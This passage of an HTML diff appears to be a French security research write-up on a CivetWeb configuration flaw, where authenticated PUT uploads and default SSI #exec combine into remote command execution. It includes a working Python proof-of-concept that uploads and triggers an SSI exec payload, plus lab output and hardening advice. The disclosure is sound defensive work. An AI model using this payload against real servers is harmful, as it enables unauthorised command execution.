+    <span style="color:#d2a8ff">mg_send_http_error</span>(conn, <span style="color:#79c0ff">304</span>, <span style="color:#a5d6ff">"%s"</span>, <span style="color:#a5d6ff">""</span>);
+} <span style="color:#ff7b72">else</span> {
+    <span style="color:#6e7681">/* Fichier statique ordinaire */</span>
+    <span style="color:#d2a8ff">send_file_data</span>(conn, &amp;file, r1, r2, <span style="color:#79c0ff">0</span>);
+}</pre>
+        </div>
+
+        <h3 data-i18n="s5_h3_2">Point 2 : l'absence totale de filtre extension dans la chaîne d'autorisation PUT</h3>
+        <p data-i18n="s5_p2">
+            La chaîne de traitement d'une requête PUT passe par <code>is_authorized_for_put()</code> (vérification des identifiants digest), puis directement dans <code>put_file()</code> sans jamais tester l'extension du fichier cible. Il n'existe pas de liste noire d'extensions dangereuses, pas de configuration de type "allow_extensions", et aucun avertissement dans le processus de validation.
+        </p>
+
+        <!-- 06 CHEMIN DE DONNEES -->
+        <h2 data-i18n="s6_h2">06 - Chemin de données complet</h2>
+
+        <div class="border border-gray-700 mb-12 rounded-sm overflow-hidden">
+            <div class="bg-gray-950 px-4 py-3 border-b border-gray-700 flex items-center gap-3">
+                <div class="flex gap-1.5">
+                    <span class="w-2.5 h-2.5 rounded-full bg-red-500"></span>
+                    <span class="w-2.5 h-2.5 rounded-full bg-yellow-500"></span>
+                    <span class="w-2.5 h-2.5 rounded-full bg-green-500"></span>
+                </div>
+                <span class="w-px h-4 bg-gray-700"></span>
+                <i class="fas fa-layer-group text-gray-500 text-xs"></i>
+                <span class="mono text-[10px] font-bold text-gray-400 tracking-widest" data-i18n="s6_lbl_1">Attack_Flow // CivetWeb PUT+SSI RCE</span>
+            </div>
+            <pre class="bg-gray-950 text-gray-300 p-6 overflow-x-auto text-[12px] leading-relaxed font-mono no-scrollbar">
+<span style="color:#ffa657">PHASE 1 : Dépôt du payload</span>
+
+  PUT /evil.shtml HTTP/1.1
+  Authorization: Digest ...          <span style="color:#6e7681">// identifiants PUT valides</span>
+  Content: &lt;!--#exec "id"--&gt;
+      |
+      v
+  is_authorized_for_put()            <span style="color:#6e7681">// vérifie digest, passe</span>
+      |
+      v
+  put_file(conn, "/docroot/evil.shtml")
+      |                              <span style="color:#6e7681">// AUCUNE vérification d'extension</span>
+      v
+<span style="color:#22c55e">  Fichier écrit sur le disque : /docroot/evil.shtml</span>
+      |
+      |
+<span style="color:#ffa657">PHASE 2 : Déclenchement</span>
+
+  GET /evil.shtml HTTP/1.1
+      |
+      v
+  match_prefix_strlen("**.shtml$", "/docroot/evil.shtml") &gt; 0  <span style="color:#ef4444">TRUE</span>
+      |
+      v
+  handle_ssi_file_request()
+      |
+      v
+  send_ssi_file() : scan octet par octet, trouve &lt;!--#exec
+      |
+      v
+  do_ssi_exec(conn, " \"id\"")
+      |
+      v
+<span class="hl">  popen("id", "r")                   <span style="color:#6e7681">// /bin/sh -c "id"</span></span>
+      |
+      v
+<span style="color:#ef4444">  SORTIE ENVOYÉE AU CLIENT DANS LA RÉPONSE HTTP 200</span></pre>
+        </div>
+
+        <!-- 07 DEMONSTRATION -->
+        <h2 data-i18n="s7_h2">07 - Démonstration live (PoC)</h2>
+
+        <p data-i18n="s7_p1">
+            La démonstration a été conduite en conditions réelles sur deux environnements : un binaire compilé avec MSVC sous <strong>Windows 11</strong> et un binaire compilé avec GCC sous <strong>Linux</strong>. Dans les deux cas, CivetWeb a été configuré avec <code>put_delete_auth_file</code> pointant vers un fichier de mots de passe digest standard, et <code>ssi_pattern</code> laissé à sa valeur par défaut.
+        </p>
+
+        <h3 data-i18n="s7_h3_1">Configuration du serveur de test</h3>
+
+        <div class="border border-gray-700 mb-12 rounded-sm overflow-hidden">
+            <div class="bg-gray-950 px-4 py-3 border-b border-gray-700 flex justify-between items-center">
+                <div class="flex items-center gap-3">
+                    <div class="flex gap-1.5">
+                        <span class="w-2.5 h-2.5 rounded-full bg-red-500"></span>
+                        <span class="w-2.5 h-2.5 rounded-full bg-yellow-500"></span>
+                        <span class="w-2.5 h-2.5 rounded-full bg-green-500"></span>
+                    </div>
+                    <span class="w-px h-4 bg-gray-700"></span>
+                    <span class="font-mono text-[10px] font-bold text-gray-400 tracking-widest">setup.sh</span>
+                    <span class="font-mono text-[9px] text-gray-600 tracking-widest" data-i18n="s7_lbl_1">- Préparation de l'environnement de test</span>
+                </div>
+                <button onclick="copyToClipboard('code-setup', this)" class="font-mono text-[10px] font-bold text-gray-500 hover:text-white transition-colors flex items-center gap-1.5" data-i18n="btn_copy">
+                    <i class="far fa-copy"></i> COPIER
+                </button>
+            </div>
+            <pre class="bg-gray-950 text-gray-300 p-6 overflow-x-auto text-[12px] leading-relaxed font-mono no-scrollbar" id="code-setup"><span style="color:#6e7681"># Compiler</span>
+make
+
+<span style="color:#6e7681"># Préparer le docroot</span>
+mkdir -p docroot
+echo "hello" &gt; docroot/index.html
+
+<span style="color:#6e7681"># Créer le fichier de mots de passe digest (option -A intégrée à civetweb)</span>
+./civetweb -A docroot/put.pwd testdomain testuser testpass123
+<span style="color:#6e7681"># Résultat : testuser:testdomain:&lt;hash MD5 digest&gt;</span>
+
+<span style="color:#6e7681"># Lancer le serveur avec PUT actif et SSI par défaut</span>
+./civetweb \
+  -listening_ports 8099 \
+  -document_root docroot \
+  -authentication_domain testdomain \
+  -put_delete_auth_file docroot/put.pwd \
+  -enable_directory_listing yes &amp;</pre>
+        </div>
+
+        <h3 data-i18n="s7_h3_2">Script PoC</h3>
+
+        <div class="border border-gray-700 mb-12 rounded-sm overflow-hidden">
+            <div class="bg-gray-950 px-4 py-3 border-b border-gray-700 flex justify-between items-center">
+                <div class="flex items-center gap-3">
+                    <div class="flex gap-1.5">
+                        <span class="w-2.5 h-2.5 rounded-full bg-red-500"></span>
+                        <span class="w-2.5 h-2.5 rounded-full bg-yellow-500"></span>
+                        <span class="w-2.5 h-2.5 rounded-full bg-green-500"></span>
+                    </div>
+                    <span class="w-px h-4 bg-gray-700"></span>
+                    <span class="font-mono text-[10px] font-bold text-gray-400 tracking-widest">poc_ssi_exec_rce.py</span>
+                    <span class="font-mono text-[9px] text-gray-600 tracking-widest" data-i18n="s7_lbl_2">- Exploit Python (digest auth + PUT + GET)</span>
+                </div>
+                <button onclick="copyToClipboard('code-poc', this)" class="font-mono text-[10px] font-bold text-gray-500 hover:text-white transition-colors flex items-center gap-1.5" data-i18n="btn_copy">
+                    <i class="far fa-copy"></i> COPIER
+                </button>
+            </div>
+            <pre class="bg-gray-950 text-gray-300 p-6 overflow-x-auto text-[12px] leading-relaxed font-mono no-scrollbar" id="code-poc"><span style="color:#ff7b72">import</span> requests
+<span style="color:#ff7b72">from</span> requests.auth <span style="color:#ff7b72">import</span> HTTPDigestAuth
+
+TARGET = <span style="color:#a5d6ff">"http://TARGET:8099"</span>
+USER, PASS = <span style="color:#a5d6ff">"testuser"</span>, <span style="color:#a5d6ff">"testpass123"</span>
+CMD = <span style="color:#a5d6ff">"id && uname -a && hostname"</span>
+
+<span style="color:#6e7681"># Syntaxe SSI spécifique CivetWeb : pas de "cmd=" avant les guillemets</span>
+payload = <span style="color:#ff7b72">f</span><span style="color:#a5d6ff">'&lt;!--#exec "{CMD}"--&gt;'</span>
+
+<span style="color:#6e7681"># Phase 1 : dépôt du payload via PUT authentifié (digest)</span>
+url = <span style="color:#ff7b72">f</span><span style="color:#a5d6ff">"{TARGET}/pwn.shtml"</span>
+r = requests.<span style="color:#d2a8ff">put</span>(url, data=payload.encode(),
+                    auth=<span style="color:#d2a8ff">HTTPDigestAuth</span>(USER, PASS))
+<span style="color:#ff7b72">print</span>(<span style="color:#ff7b72">f</span><span style="color:#a5d6ff">"PUT  {url} -&gt; HTTP {r.status_code}"</span>)
+
+<span style="color:#6e7681"># Phase 2 : déclenchement via GET (aucune auth requise)</span>
+r2 = requests.<span style="color:#d2a8ff">get</span>(url)
+<span style="color:#ff7b72">print</span>(<span style="color:#ff7b72">f</span><span style="color:#a5d6ff">"GET  {url} -&gt; HTTP {r2.status_code}"</span>)
+<span style="color:#ff7b72">print</span>(<span style="color:#a5d6ff">"---- output ----"</span>)
+<span style="color:#ff7b72">print</span>(r2.text.strip())
+
+<span style="color:#6e7681"># Nettoyage (optionnel)</span>
+requests.<span style="color:#d2a8ff">delete</span>(url, auth=<span style="color:#d2a8ff">HTTPDigestAuth</span>(USER, PASS))</pre>
+        </div>
+
+        <h3 data-i18n="s7_h3_3">Résultat observé</h3>
+
+        <div class="border border-gray-700 mb-12 rounded-sm overflow-hidden">
+            <div class="bg-gray-950 px-4 py-3 border-b border-gray-700 flex items-center gap-3">
+                <div class="flex gap-1.5">
+                    <span class="w-2.5 h-2.5 rounded-full bg-red-500"></span>
+                    <span class="w-2.5 h-2.5 rounded-full bg-yellow-500"></span>
+                    <span class="w-2.5 h-2.5 rounded-full bg-green-500"></span>
+                </div>
+                <span class="w-px h-4 bg-gray-700"></span>
+                <span class="mono text-[10px] font-bold text-gray-400 tracking-widest" data-i18n="s7_lbl_3">terminal // demo live</span>
+            </div>
+            <pre class="bg-gray-950 text-gray-300 p-6 overflow-x-auto text-[12px] leading-relaxed font-mono no-scrollbar">$ python poc_ssi_exec_rce.py
+
+PUT  http://192.168.229.131:8099/pwn.shtml -&gt; HTTP <span style="color:#22c55e">200</span>
+GET  http://192.168.229.131:8099/pwn.shtml -&gt; HTTP <span style="color:#22c55e">200</span>
+---- output ----
+<span style="color:#ef4444">uid=1000(bugpwn) gid=1000(bugpwn) groups=1000(bugpwn)</span>
+<span style="color:#ef4444">Linux ubuntu-lab 6.8.0-45-generic #45-Ubuntu SMP x86_64 GNU/Linux</span>
+<span style="color:#ef4444">ubuntu-lab</span></pre>
+        </div>
+
+        <div class="box danger">
+            <div class="box-title" data-i18n="s7_b_t">Portée de l'exécution</div>
+            <p data-i18n="s7_b_p">Les commandes s'exécutent avec les droits du processus CivetWeb, typiquement le compte qui a lancé le serveur (souvent root dans les systèmes embarqués ou les appareils IoT). Sur Linux, <code>popen()</code> invoque <code>/bin/sh -c "commande"</code> : toutes les fonctionnalités du shell sont disponibles (pipes, redirection, variables d'environnement, appels système). Sur Windows, CivetWeb redéfinit <code>popen()</code> en <code>_popen()</code> qui appelle <code>cmd.exe</code> : mêmes capacités d'exécution.</p>
+        </div>
+
+        <!-- 08 POURQUOI PAS UN CVE -->
+        <h2 data-i18n="s8_h2">08 - Pourquoi ce n'est pas un CVE civetweb</h2>
+
+        <p data-i18n="s8_p1">
+            Certains lecteurs pourraient s'attendre à voir un numéro CVE dans cet article. Il n'y en a pas, et ce n'est pas un oubli. Voici la distinction importante : <strong>un CVE qualifie un défaut dans le code</strong> (logique cassée, dépassement de tampon, contournement de sécurité). Ici, le code fait exactement ce qu'il est documenté pour faire, sans aucune erreur de logique interne.
+        </p>
+
+        <table class="tbl">
+            <thead>
+                <tr>
+                    <th data-i18n="th_context">Contexte</th>
+                    <th data-i18n="th_verdict">Verdict</th>
+                    <th data-i18n="th_reason">Raison</th>
+                </tr>
+            </thead>
+            <tbody>
+                <tr>
+                    <td data-i18n="s8_td1">CVE contre CivetWeb</td>
+                    <td data-i18n="s8_td1_v"><span class="bdg b">Non</span></td>
+                    <td data-i18n="s8_td1_r">Comportement documenté et intentionnel, identique à Apache mod_include depuis 1995.</td>
+                </tr>
+                <tr>
+                    <td data-i18n="s8_td2">Finding pentest sur un déploiement</td>
+                    <td data-i18n="s8_td2_v"><span class="bdg r">Oui</span></td>
+                    <td data-i18n="s8_td2_r">"Unrestricted file upload leading to RCE via SSI injection" est un finding reconnu, classé OWASP, rapporté en audit professionnel.</td>
+                </tr>
+                <tr>
+                    <td data-i18n="s8_td3">Recommandation de hardening pour CivetWeb</td>
+                    <td data-i18n="s8_td3_v"><span class="bdg a">Oui, légitime</span></td>
+                    <td data-i18n="s8_td3_r">La documentation devrait avertir explicitement, comme Apache le fait dans son propre UserManual depuis des décennies.</td>
+                </tr>
+            </tbody>
+        </table>
+
+        <p data-i18n="s8_p2">
+            Le précédent est établi depuis longtemps. La documentation officielle d'Apache <code>mod_include</code> dit explicitement : <em>"It is recommended that you do not enable exec for any directory where users other than the system administrator can write."</em> CivetWeb, lui, n'émet aucun avertissement équivalent dans la documentation de <code>ssi_pattern</code> ni dans celle de <code>put_delete_auth_file</code>. C'est l'angle mort concret : deux pages de documentation qui décrivent deux options indépendantes, sans jamais mentionner leur interaction explosive.
+        </p>
+
+        <!-- 09 RECOMMANDATIONS -->
+        <h2 data-i18n="s9_h2">09 - Recommandations</h2>
+
+        <h3 data-i18n="s9_h3_1">Pour les administrateurs et intégrateurs</h3>
+
+        <div class="steps">
+            <div class="step">
+                <div class="sn">1</div>
+                <div>
+                    <div class="sb-title" data-i18n="s9_st1_t">Désactiver ssi_pattern si PUT est actif</div>
+                    <div class="sb-desc" data-i18n="s9_st1_d">Dans votre configuration CivetWeb, ajouter <code>ssi_pattern=""</code> (valeur vide) si <code>put_delete_auth_file</code> est configuré. C'est la correction la plus directe et la plus sûre. Le templating SSI n'est presque jamais nécessaire dans les usages IoT ou embarqués typiques.</div>
+                </div>
+            </div>
+            <div class="step">
+                <div class="sn">2</div>
+                <div>
+                    <div class="sb-title" data-i18n="s9_st2_t">Séparer les docroots upload et contenu servi</div>
+                    <div class="sb-desc" data-i18n="s9_st2_d">Si le PUT doit coexister avec le SSI : placer les fichiers autorisés en upload dans un sous-répertoire dédié (<code>/uploads/</code>) et configurer <code>ssi_pattern</code> pour ne jamais matcher ce répertoire (ex : <code>"**.shtml$"</code> remplacé par <code>"/static/**.shtml$"</code> en chemin absolu).</div>
+                </div>
+            </div>
+            <div class="step">
+                <div class="sn">3</div>
+                <div>
+                    <div class="sb-title" data-i18n="s9_st3_t">Appliquer le principe du moindre privilège sur les comptes PUT</div>
+                    <div class="sb-desc" data-i18n="s9_st3_d">Traiter tout compte autorisé dans <code>put_delete_auth_file</code> avec le même niveau de confiance qu'un accès shell. Ne pas distribuer ces identifiants comme des "mots de passe d'upload bénins" : ils donnent accès à la surface d'exécution complète du serveur si SSI est actif.</div>
+                </div>
+            </div>
+            <div class="step">
+                <div class="sn">4</div>
+                <div>
+                    <div class="sb-title" data-i18n="s9_st4_t">Lancer le processus serveur avec le minimum de droits</div>
+                    <div class="sb-desc" data-i18n="s9_st4_d">Sur Linux, créer un utilisateur dédié sans shell (<code>useradd -r -s /sbin/nologin civetweb</code>) et lancer le serveur sous cet utilisateur. Sur les systèmes embarqués sans gestion utilisateur, sandboxer le processus via <code>seccomp</code>, <code>chroot</code> ou namespaces Linux pour limiter la portée des commandes exécutées via SSI.</div>
+                </div>
+            </div>
+            <div class="step">
+                <div class="sn">5</div>
+                <div>
+                    <div class="sb-title" data-i18n="s9_st5_t">Auditer les déploiements existants</div>
+                    <div class="sb-desc" data-i18n="s9_st5_d">Vérifier la configuration de tout serveur CivetWeb en production : <code>grep -i "put_delete_auth_file\|ssi_pattern" civetweb.conf</code>. Si les deux options sont présentes simultanément, l'exposition au RCE est immédiate pour tout détenteur des identifiants PUT.</div>
+                </div>
+            </div>
+        </div>
+
+        <h3 data-i18n="s9_h3_2">Pour le projet CivetWeb</h3>
+
+        <div class="steps">
+            <div class="step">
+                <div class="sn">1</div>
+                <div>
+                    <div class="sb-title" data-i18n="s9_st6_t">Ajouter un avertissement dans la documentation</div>
+                    <div class="sb-desc" data-i18n="s9_st6_d">Dans <code>docs/UserManual.md</code>, section <code>ssi_pattern</code> : avertir explicitement que <code>#exec</code> est équivalent à un accès shell et ne doit jamais être actif dans des répertoires où des utilisateurs peuvent déposer des fichiers via PUT ou tout autre mécanisme d'upload. Modéliser sur l'avertissement présent dans la documentation officielle Apache mod_include.</div>
+                </div>
+            </div>
+            <div class="step">
+                <div class="sn">2</div>
+                <div>
+                    <div class="sb-title" data-i18n="s9_st7_t">Envisager une option ssi_exec séparée</div>
+                    <div class="sb-desc" data-i18n="s9_st7_d">Séparer le pattern SSI en deux options distinctes : <code>ssi_pattern</code> (pour <code>#include</code>) et <code>ssi_exec_pattern</code> (pour <code>#exec</code>), cette dernière étant désactivée par défaut. Les deux fonctionnalités ne posent pas le même risque et ne devraient pas partager le même interrupteur.</div>
+                </div>
+            </div>
+        </div>
+
+        <!-- 10 REFERENCES -->
+        <h2 data-i18n="s10_h2">10 - Références</h2>
+
+        <ul class="space-y-3">
+            <li data-i18n="s10_li1">CivetWeb, <em>UserManual.md, section ssi_pattern</em> : <a href="https://github.com/civetweb/civetweb/blob/master/docs/UserManual.md" target="_blank" class="underline underline-offset-4 decoration-1 hover:text-black transition-colors">github.com/civetweb/civetweb</a></li>
+            <li data-i18n="s10_li2">CivetWeb, <em>docs/api/mg_start.md, option put_delete_auth_file</em> : <a href="https://github.com/civetweb/civetweb/blob/master/docs/api/mg_start.md" target="_blank" class="underline underline-offset-4 decoration-1 hover:text-black transition-colors">github.com/civetweb/civetweb</a></li>
+            <li data-i18n="s10_li3">Apache HTTP Server, <em>mod_include documentation : security warning on exec</em> : <a href="https://httpd.apache.org/docs/current/mod/mod_include.html" target="_blank" class="underline underline-offset-4 decoration-1 hover:text-black transition-colors">httpd.apache.org</a></li>
+            <li data-i18n="s10_li4">OWASP, <em>Server-Side Includes (SSI) Injection</em> : <a href="https://owasp.org/www-community/attacks/Server-Side_Includes_(SSI)_Injection" target="_blank" class="underline underline-offset-4 decoration-1 hover:text-black transition-colors">owasp.org</a></li>
+            <li data-i18n="s10_li5">OWASP, <em>Unrestricted File Upload</em> (CWE-434) : <a href="https://owasp.org/www-community/vulnerabilities/Unrestricted_File_Upload" target="_blank" class="underline underline-offset-4 decoration-1 hover:text-black transition-colors">owasp.org</a></li>
+            <li data-i18n="s10_li6">CivetWeb GitHub, commit <em>588860e3 "Refactor request handling"</em> : <a href="https://github.com/civetweb/civetweb/commit/588860e3" target="_blank" class="underline underline-offset-4 decoration-1 hover:text-black transition-colors">github.com/civetweb/civetweb</a></li>
+        </ul>
+
+        <div class="box ok">
+            <div class="box-title" data-i18n="s10_b_t">Conclusion</div>
+            <p data-i18n="s10_b_p">La leçon de cet audit n'est pas "CivetWeb est vulnérable" mais "deux fonctionnalités chacune raisonnable peuvent produire ensemble un résultat qu'aucune des deux ne devrait produire seule". C'est une classe de problème de sécurité dont la détection nécessite une analyse multi-options plutôt qu'une simple lecture de code ligne par ligne. Les administrateurs doivent traiter <code>ssi_pattern</code> et <code>put_delete_auth_file</code> comme des options mutuellement exclusives jusqu'à ce que la documentation et l'implémentation CivetWeb introduisent des gardes appropriées.</p>
+        </div>
+
+    </main>
+
+    <!-- NEWSLETTER -->
+    <section class="py-24 bg-black text-white border-t border-black">
+        <div class="max-w-4xl mx-auto px-6 text-center">
+            <h2 class="text-3xl font-black uppercase tracking-tighter mb-6" data-i18n="news_title">Recevoir nos recherches (0-Spam)</h2>
+            <p class="text-gray-400 font-light mb-10 text-sm" data-i18n="news_desc">
+                Inscrivez-vous à notre flux de transmission sécurisé. Uniquement des writeups techniques, des annonces de CTF et des rapports d'audit publics.
+            </p>
+            <form class="flex flex-col md:flex-row gap-4 justify-center" id="newsletter-form">
+                <input type="email" id="news-input" required placeholder="email@domain.com"
+                    class="bg-transparent border border-gray-600 px-6 py-3 text-sm focus:outline-none focus:border-white w-full md:w-96 font-mono text-center md:text-left">
+                <button type="submit" id="news-btn" data-i18n="news_btn"
+                    class="bg-white text-black px-8 py-3 text-[11px] font-black uppercase tracking-widest hover:bg-gray-200 transition-all">
+                    S'abonner_
+                </button>
+            </form>
+        </div>
+    </section>
+
+    <!-- FOOTER -->
+    <footer class="bg-gray-100 py-16 border-t border-gray-300">
+        <div class="max-w-7xl mx-auto px-6 grid grid-cols-1 md:grid-cols-4 gap-12">
+            <div class="space-y-6">
+                <div class="text-xl font-black tracking-tighter mb-4">BUG|PWN</div>
+                <p class="text-[11px] leading-relaxed text-gray-500 uppercase tracking-wider max-w-xs font-medium" data-i18n="footer_bio">
+                    Unité de recherche en vulnérabilités avancées et audit de systèmes critiques.
+                </p>
+                <div class="flex gap-4">
+                    <a href="https://x.com/bug_pwn" target="_blank" class="w-8 h-8 bg-black text-white rounded-full flex items-center justify-center hover:bg-gray-700"><i class="fab fa-x-twitter"></i></a>
+                    <a href="https://github.com/0xbugpwn" target="_blank" class="w-8 h-8 bg-black text-white rounded-full flex items-center justify-center hover:bg-gray-700"><i class="fab fa-github"></i></a>
+                    <a href="https://www.linkedin.com/company/0xbugpwn" target="_blank" class="w-8 h-8 bg-black text-white rounded-full flex items-center justify-center hover:bg-gray-700"><i class="fab fa-linkedin"></i></a>
+                    <a href="https://www.youtube.com/@bug_pwn" target="_blank" class="w-8 h-8 bg-black text-white rounded-full flex items-center justify-center hover:bg-gray-700"><i class="fab fa-youtube"></i></a>
+                </div>
+            </div>
+            <div>
+                <h5 class="text-[10px] font-black text-gray-400 uppercase tracking-[0.3em] mb-10">Capabilities_Index</h5>
+                <ul class="space-y-4 text-[11px] font-bold uppercase tracking-widest text-black">
+                    <li><a href="#" class="hover:underline underline-offset-8 decoration-1 transition-all">Reverse Engineering</a></li>
+                    <li><a href="#" class="hover:underline underline-offset-8 decoration-1 transition-all">Exploit Development</a></li>
+                    <li><a href="#" class="hover:underline underline-offset-8 decoration-1 transition-all" data-i18n="f_link_audit">Audit de Code Source</a></li>
+                    <li><a href="#" class="hover:underline underline-offset-8 decoration-1 transition-all" data-i18n="f_link_ics">Systèmes Industriels</a></li>
+                </ul>
+            </div>
+            <div>
+                <h5 class="text-[10px] font-black text-gray-400 uppercase tracking-[0.3em] mb-10">Knowledge_Base</h5>
+                <ul class="space-y-4 text-[11px] font-bold uppercase tracking-widest text-black">
+                    <li><a href="#" class="hover:underline underline-offset-8 decoration-1 transition-all">Repository Writeups</a></li>
+                    <li><a href="#" class="hover:underline underline-offset-8 decoration-1 transition-all">Whitepapers</a></li>
+                    <li><a href="#" class="hover:underline underline-offset-8 decoration-1 transition-all" data-i18n="f_link_tools">Outils Open Source</a></li>
+                    <li><a href="https://bugpwn.com/battlectf/archive/" target="_blank" class="hover:underline underline-offset-8 decoration-1 transition-all">CTF Archives</a></li>
+                </ul>
+            </div>
+            <div class="space-y-6">
+                <h5 class="text-[10px] font-black text-gray-400 uppercase tracking-[0.3em] mb-10">Secure_Channel</h5>
+                <p class="text-[10px] text-gray-400 uppercase tracking-widest font-medium italic" data-i18n="footer_pgp">
+                    Pour toute communication sensible, privilégiez le chiffrement PGP.
+                </p>
+                <a href="../contact.html#pgp-section" class="inline-block border border-black px-3 py-1 text-xs font-mono font-bold hover:bg-black hover:text-white transition">
+                    <i class="fas fa-key mr-2"></i> 0x0E42807D
+                </a>
+                <p class="text-xs text-gray-400 mt-4">© 2026 BUG|PWN RESEARCH UNIT. <br>ALL RIGHTS RESERVED.</p>
+            </div>
+        </div>
+    </footer>
+
+    <script>
+        const translations = {
+            fr: {
+                /* nav / header */
+                nav_services: "Services", nav_research: "Recherche", nav_blog: "Blog",
+                nav_events: "Events", nav_contact: "Nous contacter",
+                art_back: "<i class=\"fas fa-arrow-left group-hover:-translate-x-2 transition-transform\"></i> Retour_Archives",
+                tag_sec: "Web Security", tag_research: "Research", tag_rce: "RCE · Demo Live",
+                art_title: "CivetWeb :<br><span class=\"text-gray-300\">PUT + SSI</span><br>= RCE.",
+                art_subtitle: "Comment deux fonctionnalités entièrement légitimes et documentées de CivetWeb se combinent silencieusement pour produire une exécution de commande arbitraire à distance. Analyse du code source, démonstration en conditions réelles et recommandations de hardening.",
+                art_level: "Niveau : intermédiaire", art_read_time: "Lecture : 15 min",
+                art_tag: "CivetWeb 1.17 · <strong style=\"color:#b45309\">Medium (auth requise)</strong>",
+                art_author_role: "Lead Vulnerability Researcher",
+                /* TOC */
+                toc_title: "Table des matières",
+                toc_1: "<strong>01.</strong> Résumé exécutif",
+                toc_2: "<strong>02.</strong> Contexte : CivetWeb",
+                toc_3: "<strong>03.</strong> La brique 1 : PUT authentifié",
+                toc_4: "<strong>04.</strong> La brique 2 : SSI #exec par défaut",
+                toc_5: "<strong>05.</strong> Analyse du code source",
+                toc_6: "<strong>06.</strong> Chemin de données complet",
+                toc_7: "<strong>07.</strong> Démonstration live (PoC)",
+                toc_8: "<strong>08.</strong> Pourquoi ce n'est pas un CVE",
+                toc_9: "<strong>09.</strong> Recommandations",
+                toc_10: "<strong>10.</strong> Références",
+                /* S1 */
+                s1_h2: "01 - Résumé exécutif",
+                s1_p1: "<strong>CivetWeb</strong> est un serveur HTTP embarqué open-source très utilisé dans les systèmes IoT, les équipements industriels et les applications C/C++ nécessitant un serveur web intégré. Sa conception monofichier (<code>civetweb.c</code>, environ 23 000 lignes) le rend attractif pour l'embarqué, mais concentre également une grande surface de code dans un seul composant.",
+                s1_p2: "Lors d'un audit de code complet de la version <strong>1.17</strong> (branche master, commit <code>588860e3</code>), nous avons identifié une combinaison de deux fonctionnalités entièrement légitimes et documentées qui, une fois activées ensemble, permettent à tout utilisateur disposant d'identifiants PUT d'exécuter des commandes arbitraires sur le serveur. Ce n'est pas un bug du code, mais une interaction non documentée entre deux options de configuration.",
+                s1_b_t: "Impact réel sur les déploiements",
+                s1_b_p: "Tout déploiement CivetWeb ayant activé <code>put_delete_auth_file</code> (PUT distant avec authentification) est exposé au RCE complet pour n'importe quel compte autorisé au PUT, y compris les comptes \"upload seulement\" pensés comme non-privilégiés. Le SSI <code>#exec</code> étant actif par défaut pour <code>*.shtml</code> et <code>*.shtm</code>, aucune configuration supplémentaire n'est requise du côté de l'attaquant.",
+                th_attr: "Attribut", th_val: "Valeur",
+                s1_td1: "Logiciel",
+                s1_td2: "Type", s1_td2_v: "Combinaison de fonctionnalités : File Upload + SSI Exec (CWE-434 + CWE-1188)",
+                s1_td3: "Prérequis", s1_td3_v: "<code>put_delete_auth_file</code> configuré + identifiants PUT valides",
+                s1_td4: "Impact", s1_td4_v: "RCE avec les droits du processus serveur",
+                s1_td5: "Vecteur", s1_td5_v: "Réseau (HTTP PUT + HTTP GET)",
+                s1_td6: "Sévérité (CVSS-like)", s1_td6_v: "<span class=\"bdg a\">Medium (6.8) si auth</span>",
+                s1_td7: "CVE assigné", s1_td7_v: "<span class=\"bdg b\">Non (comportement documenté)</span>",
+                s1_td8: "Correction recommandée", s1_td8_v: "Désactiver <code>ssi_pattern</code> si PUT actif, ou séparer les docroots",
+                /* S2 */
+                s2_h2: "02 - Contexte : CivetWeb",
+                s2_h3_1: "Qu'est-ce que CivetWeb ?",
+                s2_p1: "CivetWeb est un fork de Mongoose (avant sa bifurcation commerciale), maintenu comme projet open-source. Il est conçu pour être intégré directement dans une application C/C++ via l'inclusion d'un seul fichier source. On le retrouve fréquemment dans des interfaces web d'équipements réseau, des consoles d'administration IoT, des logiciels embarqués industriels, et des outils de développement local.",
+                s2_p2: "Son modèle de configuration repose sur des paires clé/valeur passées au démarrage du serveur, soit par fichier de configuration, soit par arguments en ligne de commande. Deux de ces options sont au coeur de notre analyse : <code>put_delete_auth_file</code>, qui active la méthode HTTP PUT pour écrire des fichiers sur le serveur, et <code>ssi_pattern</code>, qui définit les extensions de fichiers interprétés comme des pages SSI (Server Side Includes).",
+                s2_lbl_1: "- Configuration par défaut des deux options clés",
+                s2_b_t: "Modèle de confiance implicite",
+                s2_b_p: "La documentation de <code>put_delete_auth_file</code> décrit cette option comme permettant \"l'écriture de fichiers sur le serveur via PUT\". La documentation de <code>ssi_pattern</code> décrit le SSI comme un \"langage de templating serveur simple\". Aucune des deux pages de documentation ne mentionne que les combiner équivaut à donner un accès shell à tout compte PUT.",
+                /* S3 */
+                s3_h2: "03 - La brique 1 : PUT authentifié sans restriction d'extension",
+                s3_p1: "Lorsqu'un administrateur configure <code>put_delete_auth_file</code> pour pointer vers un fichier de mots de passe digest, CivetWeb accepte les requêtes HTTP PUT authentifiées et écrit leur corps directement sur le disque dans le <code>document_root</code>. La fonction qui gère cette écriture est <code>put_file()</code> à la ligne 12500 de <code>civetweb.c</code>.",
+                s3_lbl_1: "- put_file() : aucune restriction d'extension",
+                s3_p2: "La vérification d'autorisation en amont (<code>is_authorized_for_put()</code>) confirme uniquement que l'utilisateur connaît les identifiants du fichier <code>put_delete_auth_file</code>. Elle ne pose aucune question sur l'extension ou le contenu du fichier que cet utilisateur veut déposer. Un compte PUT est strictement équivalent, en termes de capacité réelle, à un accès FTP complet au <code>document_root</code>.",
+                /* S4 */
+                s4_h2: "04 - La brique 2 : SSI #exec actif par défaut",
+                s4_p1: "Les Server Side Includes (SSI) sont une technologie de templating serveur des années 90, permettant d'inclure dynamiquement du contenu dans une page HTML sans passer par un langage de script complet. CivetWeb supporte deux directives SSI : <code>include</code> (inclusion d'un autre fichier) et <code>exec</code> (exécution d'une commande shell et inclusion de sa sortie standard dans la réponse).",
+                s4_p2: "La correspondance extension/interprétation SSI est vérifiée par <code>match_prefix_strlen()</code> sur la valeur de <code>ssi_pattern</code> avant chaque service de fichier. La valeur par défaut <code>\"**.shtml$|**.shtm$\"</code> s'applique à tous les fichiers sous n'importe quel sous-répertoire du <code>document_root</code> dont le nom se termine par <code>.shtml</code> ou <code>.shtm</code>. Aucune option séparée n'existe pour désactiver uniquement <code>#exec</code> en gardant <code>#include</code> actif.",
+                s4_lbl_1: "- do_ssi_exec() : popen() sans filtrage",
+                s4_b_t: "Syntaxe SSI spécifique à CivetWeb",
+                s4_b_p: "Attention : la syntaxe <code>#exec</code> dans CivetWeb est <strong>différente</strong> de la syntaxe Apache classique. CivetWeb attend <code>&lt;!--#exec \"commande\"--&gt;</code> (sans <code>cmd=</code>), contrairement à <code>&lt;!--#exec cmd=\"commande\"--&gt;</code> utilisé par Apache mod_include. Le <code>sscanf</code> interne parse le premier guillemet immédiatement après le nom de la directive.",
+                /* S5 */
